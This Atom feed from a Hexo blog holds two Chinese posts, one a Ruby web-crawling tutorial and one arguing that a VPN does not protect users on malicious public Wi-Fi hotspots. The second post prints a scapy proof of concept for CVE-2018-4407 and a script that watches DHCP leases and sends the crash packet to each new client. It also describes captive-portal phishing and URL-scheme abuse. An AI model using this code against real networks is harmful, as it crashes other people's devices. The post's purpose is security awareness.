<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>YYF&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-04-01T03:35:14.538Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>qingxp9</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>三步学会爬动态网站</title>
    <link href="http://yoursite.com/2019/crawl-dynamic/"/>
    <id>http://yoursite.com/2019/crawl-dynamic/</id>
    <published>2019-04-01T03:34:12.000Z</published>
    <updated>2019-04-01T03:35:14.538Z</updated>
    
    <content type="html"><![CDATA[<p>在我们写爬虫程序时，难免会碰到一些动态加载的网页，为获取数据制造了困难。本篇文章我将尝试用非常简短的篇幅来教大家：如何应对动态加载的网页。</p><p>以Ruby语言为例，可以在Linux、Mac、Windows等平台上进行实验。</p><h2 id="1-目标分析"><a href="#1-目标分析" class="headerlink" title="1.目标分析"></a>1.目标分析</h2><p>目标：收集目标网站上公开的所有产品型号</p><p>所有的产品通过类型进行分类，如下所示：<br><img src="/images/15540895874713.jpg" alt=""></p><p>当点击某个分类后，出现具体的产品信息：<br><img src="/images/15540895996412.jpg" alt=""><br><img src="/images/15540896080674.jpg" alt=""></p><p>需要注意的是，这部分产品信息是通过解析参数后动态加载的，这是本篇要解决的主要问题：</p><h2 id="2-Nokogiri"><a href="#2-Nokogiri" class="headerlink" title="2.Nokogiri"></a>2.Nokogiri</h2><p><a href="https://nokogiri.org/" target="_blank" rel="noopener">https://nokogiri.org/</a><br>Nokogiri是一个用于解析HTML, XML, SAX等内容的开源Ruby库，可以通过XPath和CSS选择器语法来操作内容。</p><p>安装:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install ruby</span><br><span class="line">gem install nokogiri</span><br></pre></td></tr></table></figure></p><p>通过简单分析，各分类的url位于以下结构中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul class=&quot;header-subnav-list&quot;&gt;</span><br><span class="line">  &lt;li&gt;</span><br><span class="line">    &lt;a&gt;&lt;/a&gt;</span><br><span class="line">  &lt;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/images/15540896284049.jpg" alt=""></p><p>由于这些内容在网站中是静态的，我们直接使用open-uri打开目标网页，配合Nokogiri来获取各分类的url:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#irb是Ruby的交互式shell，</span><br><span class="line">root@bad:~# irb</span><br><span class="line"></span><br><span class="line">require &apos;nokogiri&apos;</span><br><span class="line">require &apos;open-uri&apos;</span><br><span class="line"></span><br><span class="line">#获取目标网站HTML代码</span><br><span class="line">doc=Nokogiri::HTML(open(&quot;http://www.xxxx.com&quot;))</span><br><span class="line"></span><br><span class="line">#通过xpath选择器获取目标内容</span><br><span class="line">ar=doc.xpath(&quot;//ul[@class=&apos;header-subnav-list&apos;]//li//a&quot;)</span><br><span class="line"></span><br><span class="line">href = []</span><br><span class="line">ar.each &#123;|a| href &lt;&lt; a[&quot;href&quot;]&#125;</span><br></pre></td></tr></table></figure><p>查看一下获取的列表：<br><img src="/images/15540896411028.jpg" alt=""></p><p>前面提到，分类里边的产品列表由Javascript动态加载，这时候我们可以使用Watir来获取动态内容。</p><h2 id="3-Watir"><a href="#3-Watir" class="headerlink" title="3.Watir"></a>3.Watir</h2><p><a href="http://watir.com/" target="_blank" rel="noopener">http://watir.com/</a></p><p>Waitr是一个用于自动化测试的开源Ruby库。Watir将使用跟真人一样的浏览器交互方式来点击链接，填写表单和验证文本。可以配合Chrome、Firefox、IE、Safari、Edge等。</p><p>以Chrome为例，除了安装Waitr外，还需要安装chromedriver：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gem install watir</span><br><span class="line">apt install chromium-driver</span><br><span class="line"></span><br><span class="line">#其他平台可参考https://github.com/SeleniumHQ/selenium/wiki/ChromeDriver</span><br></pre></td></tr></table></figure></p><p>当我们使用Watir访问目标网站时，会出现一个受代码控制的Chrome窗口。（<strong>不要用鼠标去操作或者关掉它！！</strong>）<br><img src="/images/15540896539043.jpg" alt=""></p><p>由于浏览器加载内容需要一些时间，所以我们适当增加一些休眠时间确保内容加载完成。通过Watir获取了每个页面的内容后，再次通过nokogiri进行获取即可。</p><p><img src="/images/15540896617057.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#接着上面的代码</span><br><span class="line">require &apos;watir&apos;</span><br><span class="line"></span><br><span class="line">browser = Watir::Browser.new</span><br><span class="line">browser.goto &quot;http://www.xxxx.com#&#123;href[2]&#125;&quot;</span><br><span class="line">sleep(1)</span><br><span class="line">doc=Nokogiri::HTML(browser.html)</span><br><span class="line">ar=doc.xpath(&quot;//div[@class=&apos;product-list&apos;]//ul//li//a//div//span&quot;)</span><br><span class="line">ar.each &#123;|a| p a.content if a.content != &apos;&apos; &#125;</span><br></pre></td></tr></table></figure><p><img src="/images/15540896722478.jpg" alt=""></p><p>可以适当输出一些中间内容，方便在出错时调试。</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>请尽量通过公开数据进行练习，减缓爬取速度和数量。本篇文章仅用于教学演示，不为学员的任何非法使用进行负责。<br>（完）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在我们写爬虫程序时，难免会碰到一些动态加载的网页，为获取数据制造了困难。本篇文章我将尝试用非常简短的篇幅来教大家：如何应对动态加载的网页。&lt;/p&gt;
&lt;p&gt;以Ruby语言为例，可以在Linux、Mac、Windows等平台上进行实验。&lt;/p&gt;
&lt;h2 id=&quot;1-目标分析&quot;&gt;
      
    
    </summary>
    
      <category term="program" scheme="http://yoursite.com/categories/program/"/>
    
    
      <category term="crawl" scheme="http://yoursite.com/tags/crawl/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>有VPN保护就可以随意连接公共热点？大错特错</title>
    <link href="http://yoursite.com/2019/vpn-wifi/"/>
    <id>http://yoursite.com/2019/vpn-wifi/</id>
    <published>2019-02-14T10:34:12.000Z</published>
    <updated>2019-02-15T01:44:50.957Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/15501409832476.jpg" alt=""></p><h2 id="1-背景"><a href="#1-背景" class="headerlink" title="1. 背景"></a>1. 背景</h2><p>提到公共热点、钓鱼热点或恶意热点，我们通常会提到可能存在攻击者在嗅探网络流量中的敏感信息，或者结合DNS劫持打造一个高仿真的钓鱼环境，给用户造成安全威胁。<br><img src="/images/15501406200907.jpg" alt=""></p><p>许多安全从业者在接受采访或咨询时，会推荐在不安全的无线环境中开启VPN。目前国内许多手机应用还提供了免费的VPN功能，作为抵御恶意热点的安全解决方案来吸引用户下载安装。</p><p>然而许多产品在对外宣传描述时，存在描述过度或断章取义的情况，不自觉的去掉了限制条件，于是许多用户现在产生了这样的错觉：“只要使用VPN，就能抵御恶意热点中的一切攻击，随意连接WiFi热点也没关系了。”</p><p>随意搜了一下，在许多媒体文章中都是这个论调：</p><ul><li>“专家认为，通过VPN来连接WiFi是非常安全的。”</li><li>“用户只需在移动端开启VPN，填入用户名和密码，就可以安心的在公共WiFi网络中上网了。”</li></ul><p>这些描述都是不准确的，使用VPN的确能保护好设备的网络流量，但在恶意热点环境中的攻击威胁远不止如此。</p><p>通常，一个用户在连接公共热点时，往往通过如下步骤：</p><ol><li>打开无线功能，选择并连接到目标热点。</li><li>通常需要通过Captive Portal强制门户页面进行认证获取网络权限。</li><li>获取到网络权限后，有安全意识的用户会开启VPN保护流量。</li></ol><p>后文我将以实例说明，假设我是一名恶意热点搭建者，面对这些打算使用VPN进行保护的用户，我可以从哪些方面对他们造成威胁。</p><h2 id="2-攻击威胁"><a href="#2-攻击威胁" class="headerlink" title="2.攻击威胁"></a>2.攻击威胁</h2><h3 id="2-1-系统层面的漏洞"><a href="#2-1-系统层面的漏洞" class="headerlink" title="2.1 系统层面的漏洞"></a>2.1 系统层面的漏洞</h3><p>最具影响力的便是操作系统本身的漏洞，对没有及时更新修复漏洞的设备来说是通杀的效果。</p><h4 id="1）缓冲区溢出漏洞-CVE-2018-4407"><a href="#1）缓冲区溢出漏洞-CVE-2018-4407" class="headerlink" title="1）缓冲区溢出漏洞 CVE-2018-4407"></a>1）缓冲区溢出漏洞 CVE-2018-4407</h4><p>CVE-2018-4407是安全研究员Kevin Backhouse 发现的XNU系统内核中的堆缓冲区溢出漏洞，攻击者可能利用缓冲区溢出进行远程代码执行。由于iOS和macOS都使用XNU，因此iPhone、iPad和MacBook均受到影响。</p><p>影响范围：</p><ul><li>Apple iOS 11及更早版本：所有设备（升级到iOS 12的部分设备）</li><li>Apple macOS High Sierra（受影响的最高版本为10.13.6）：所有设备</li><li>Apple macOS Sierra（受影响的最高版本为10.12.6）：所有设备</li><li>Apple OS X El Capitan及更早版本：所有设备</li></ul><p>Kevin在推特中给出了PoC和演示视频，利用该漏洞可以使得同一局域网下的Macbook和iPhone设备崩溃。</p><p>可以通过scapy工具来发送数据触发该漏洞:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">send(IP(dst=&quot;1.2.3.4&quot;,options=[IPOption(&quot;A&quot;*18)])/TCP(dport=2323,options=[(19, &quot;1&quot;*18),(19, &quot;2&quot;*18)]))</span><br></pre></td></tr></table></figure></p><p>如果我们是一个钓鱼热点攻击者，想达到“自动”的效果很简单，定时监听当前网络活跃主机向其发送攻击代码即可。</p><p>假设使用了dnsmasq程序提供DHCP和DNS服务，dhcp池文件保存在‘/var/lib/misc/dnsmasq.leases’文件中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import os, time</span><br><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">lines_old = 0</span><br><span class="line">lines_new = 0</span><br><span class="line">while 1:</span><br><span class="line">    lines_old = lines_new</span><br><span class="line">    if os.path.exists(&apos;/var/lib/misc/dnsmasq.leases&apos;):</span><br><span class="line">        f = open(&apos;/var/lib/misc/dnsmasq.leases&apos;, &apos;r&apos;).readlines()</span><br><span class="line">        lines_new = len(f)</span><br><span class="line">        if lines_new &gt; lines_old:</span><br><span class="line">            for i in range(lines_old, lines_new):</span><br><span class="line">                value = f[i].split()</span><br><span class="line">                if len(value) == 5:</span><br><span class="line">                    print value[2] + &apos; &apos; + value[1] + &apos; &apos; + value[3] + &apos; Connect!&apos;</span><br><span class="line">                    </span><br><span class="line">                    for i in range(3):</span><br><span class="line">                        #For Apple devices(CVE-2018-4407)</span><br><span class="line">                        send(IP(dst=value[2],options=[IPOption(&quot;A&quot;*18)])/TCP(dport=2323,options=[(19, &quot;1&quot;*18),(19, &quot;2&quot;*18)]))                </span><br><span class="line">                        time.sleep(1)</span><br><span class="line">    time.sleep(3)</span><br></pre></td></tr></table></figure><p>该段代码的作用是：每3秒读取一次dhcp文件，如果发现新的主机，生成exploit发向该设备。</p><p>如果这些苹果设备没有及时更新到漏洞修复的版本，就会出现如下图所示的崩溃效果：</p><p><img src="/images/15501406577358.jpg" alt=""></p><h4 id="2）永恒之蓝"><a href="#2）永恒之蓝" class="headerlink" title="2）永恒之蓝"></a>2）永恒之蓝</h4><p>永恒之蓝（EternalBlue）是美国国家安全局开发的漏洞利用程序，于2017年4月14日被黑客组织Shadow Brokers泄漏。该工具利用TCP445 port上的文件共享协议漏洞进行散播。</p><p>尽管微软于2017年3月14日发布操作系统补丁修补了这个漏洞，5月12日WannaCry勒索软件利用这个漏洞传播时，很多Windows用户仍然没有安装补丁，英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。</p><p>永恒之蓝大家都很熟悉，就不继续详细说明了。对于热点网络中没有修复漏洞的Windows设备，我们已经可以获取到系统最高权限。</p><h3 id="2-2-软件应用上的漏洞"><a href="#2-2-软件应用上的漏洞" class="headerlink" title="2.2 软件应用上的漏洞"></a>2.2 软件应用上的漏洞</h3><p>除了操作系统本身外，我们安装的各类软件应用会开放一些服务，如果它们存在安全缺陷也会成为一个攻击点，比如前两天爆出的ES文件管理器的安全问题。</p><p>研究人员发现ES文件管理器启动后会创建本地HTTP服务器，在其所有后台服务被结束前该服务器始终开启，处于相同网络的任意用户可直接向安装 ES 管理器的设备发起攻击。</p><p><img src="/images/15501406782435.jpg" alt=""></p><p>所以，当连入恶意热点的Android客户端后台开启了含有漏洞的ES文件浏览器时，我们甚至可以直接从设备上获取照片、视频、文档了。</p><blockquote><p>顺便提一句，官方已经完成修复并上架应用市场，Android用户看到这记得升级一下。<br><img src="/images/15501406874750.jpg" alt=""></p></blockquote><h3 id="2-3-利用Captive-Portal进行钓鱼"><a href="#2-3-利用Captive-Portal进行钓鱼" class="headerlink" title="2.3 利用Captive Portal进行钓鱼"></a>2.3 利用Captive Portal进行钓鱼</h3><p>如果无线客户端本身不存在漏洞，我们还可以利用Captive Portal来进行一些攻击。</p><p>前面提到用户在开启VPN前，需要经过Captive Portal强制门户的认证，大部分无线设备都会自动出来一个弹窗，如下图所示。</p><p><img src="/images/15501406959850.jpg" alt=""></p><p>在打开的网页中，通常通过账号密码、手机验证码、微信认证等形式进行认证来开通网络权限，否者是没网的。</p><p>攻击者同样可以在恶意热点上实现Captive Portal认证，并自定义Portal主页对用户进行欺骗钓鱼，比如假言需要在表单中填入个人信息来换取免费使用网络，如下图所示。</p><p><img src="/images/15501407098749.jpg" alt=""></p><p>简单来说，这利用了在开启VPN前，需要通过Portal页面开通网络权限的间歇进行了钓鱼攻击。</p><h3 id="2-4-进一步利用Portal"><a href="#2-4-进一步利用Portal" class="headerlink" title="2.4 进一步利用Portal"></a>2.4 进一步利用Portal</h3><p>在Pwn2own 2018上，有许多通过浏览器发起的攻击都利用到了WiFi Captive Portal的特性进行自动触发。</p><p><img src="/images/15501407201466.jpg" alt=""></p><p>我们来仔细看看这个Portal浏览器，它与正常的系统浏览器是不一样的，出于安全考虑它并没有包含所有功能，比如Cookie、下载等功能都被限制了，但在部分手机系统上是支持URL Scheme的。</p><p><code>&lt;scheme&gt;://&lt;host&gt;:&lt;port&gt;/&lt;path&gt;?&lt;query&gt;</code></p><p>URL Scheme是iOS和Android提供给开发者的一种APP跳转方式。Android应用在Mainfest中注册自己的Scheme，iOS应用在APP属性中配置。配置完成后，就可以通过url的形式唤醒APP。比如可以利用这个技术，在Portal浏览器中调用微信进行认证。</p><p>后来我认真想了想，怎么滥用这个特性。</p><ol><li><p>连接WiFi自动打开商品淘宝页<br><img src="/images/portal_taobao.gif" alt="portal_taobao"></p></li><li><p>2019最新乞讨方式<br><img src="/images/portal_alipay.gif" alt="portal_alipay"></p></li></ol><p>后来发现三星已经发现并修复了这个利用Captive Portal自动重定向到第三方应用的问题（SVE-2018-13474）。<br><img src="/images/15501407715504.jpg" alt=""></p><p>我就想着给自己用来测试的miui也提一个，正好他们也有SRC。结果被忽略了，因为他们觉得不属于miui的问题。</p><p><img src="/images/15501407791566.jpg" alt=""></p><p>好吧。</p><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h2><p>虽然我们的终端设备通常不会直接暴露在互联网上遭到攻击，但很难确保在各类无线网络中是否存在潜藏着的攻击者。</p><p>这篇文章想表达三个重点：</p><ol><li>VPN并不是公共热点的万能保护福，它能保护网络流量，但还可能遭到其他形式的攻击。</li><li>请对所有热点采取默认不信任态度，尽量不连接公共热点。</li><li>及时进行系统、软件的更新，确保对各类安全缺陷的修复。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/images/15501409832476.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;1-背景&quot;&gt;&lt;a href=&quot;#1-背景&quot; class=&quot;headerlink&quot; title=&quot;1. 背景&quot;&gt;&lt;/a&gt;1. 背景&lt;/h2&gt;&lt;p&gt;提到公共热点、
      
    
    </summary>
    
      <category term="WiFi" scheme="http://yoursite.com/categories/wifi/"/>
    
    
      <category term="WiFi" scheme="http://yoursite.com/tags/wifi/"/>
    
      <category term="VPN" scheme="http://yoursite.com/tags/vpn/"/>
    
  </entry>
  
</feed>
